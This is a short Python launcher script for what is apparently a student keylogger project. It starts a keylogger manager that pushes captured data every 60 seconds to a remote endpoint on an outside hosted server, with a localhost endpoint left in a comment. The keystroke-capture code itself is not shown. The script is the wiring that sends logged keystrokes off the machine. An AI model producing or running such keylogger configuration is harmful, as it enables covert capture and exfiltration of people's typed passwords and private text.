import logging
from keylogger.manager import DefaultManager as manager

logger = logging.getLogger(__name__)

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )

    manager(
        endpoint="https://loggerstudentproject.onrender.com",
        # endpoint="http://localhost:5000",
        # log_path="keylogger.log",
        push_interval=60,
    ).run()
